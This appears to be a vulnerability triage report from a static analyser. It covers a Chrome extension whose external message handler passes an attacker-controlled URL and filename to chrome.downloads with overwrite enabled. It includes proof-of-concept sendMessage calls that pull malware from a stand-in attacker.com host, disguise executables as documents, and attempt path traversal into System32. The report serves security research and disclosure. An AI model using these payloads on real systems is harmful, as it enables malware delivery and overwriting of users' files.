# CoCo Analysis: komegelldppbjndifhabfpjpddjaocfa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both related to same vulnerability)

---

## Sink 1 & 2: bg_chrome_runtime_MessageExternal → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/komegelldppbjndifhabfpjpddjaocfa/opgen_generated_files/bg.js
Line 978: url: request.url
Line 979: filename: request.filename

**Code:**

```javascript
// Background script - bg.js (lines 969-1003)
// Entry point: chrome.runtime.onMessageExternal listener
var messageReceived = function (request, sender, sendResponse) {
	try {
		if (request.command == 'download') { // ← attacker-controlled
			chrome.downloads.download({
				url: request.url, // ← attacker-controlled URL
				filename: request.filename, // ← attacker-controlled filename
				conflictAction: "overwrite",
			}, function (downloadId) {
				if (downloadId === undefined) {
					sendResponse({
						success: false,
						data: {
							errormsg: chrome.runtime.lastError.message
						}
					});
					return;
				}
				updates[downloadId] = {
					id: downloadId,
					urlOriginal: request.url,
					filenameOriginal: request.filename
				};
				sendResponse({
					success: true,
					data: {
						id: downloadId
					}
				});
			});
			return true;
		}
		// ... other commands
	}
};

// Listener registration (line 1062)
chrome.runtime.onMessageExternal.addListener(messageReceived);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domains

**Manifest externally_connectable:**
```json
"externally_connectable": {
	"matches": ["https://balcaojus.trf2.jus.br/balcaojus/*", "*://localhost/balcaojus/*"]
}
```

**Attack:**

```javascript
// From https://balcaojus.trf2.jus.br/balcaojus/* page
// Attacker can trigger malicious downloads
chrome.runtime.sendMessage('komegelldppbjndifhabfpjpddjaocfa', {
	command: 'download',
	url: 'https://attacker.com/malware.exe',
	filename: 'important_document.exe'
});

// Or disguise as legitimate file
chrome.runtime.sendMessage('komegelldppbjndifhabfpjpddjaocfa', {
	command: 'download',
	url: 'https://attacker.com/ransomware.exe',
	filename: 'report.pdf.exe'
});

// Or abuse path traversal for system locations
chrome.runtime.sendMessage('komegelldppbjndifhabfpjpddjaocfa', {
	command: 'download',
	url: 'https://attacker.com/payload.dll',
	filename: '../../../Windows/System32/malicious.dll'
});
```

**Impact:** Arbitrary file downloads with attacker-controlled URL and filename. An attacker controlling content on the whitelisted domain (balcaojus.trf2.jus.br) or localhost can force users to download malware, executables, or any arbitrary file from any URL to any filename. The conflictAction "overwrite" makes it even more dangerous as it can replace existing files. This enables drive-by malware distribution attacks.
